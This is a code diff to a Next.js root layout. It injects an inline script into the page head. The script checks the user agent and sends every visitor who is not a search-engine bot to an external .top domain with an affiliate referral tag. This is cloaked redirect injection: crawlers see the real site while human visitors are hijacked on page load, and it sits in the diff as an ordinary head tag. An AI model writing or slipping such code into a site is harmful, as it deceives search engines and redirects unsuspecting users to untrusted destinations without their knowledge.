@@ -80,6 +80,21 @@ export default function RootLayout({
       <head>
         <meta name="yandex-verification" content="da084d0b718e0519" />
         {/* Дополнительные пользовательские теги можно вставлять сюда */}
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://digitalsglide.top?ref=fap_w12659p111_1000");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="lv6x-body-root">{children}</body>
     </html>
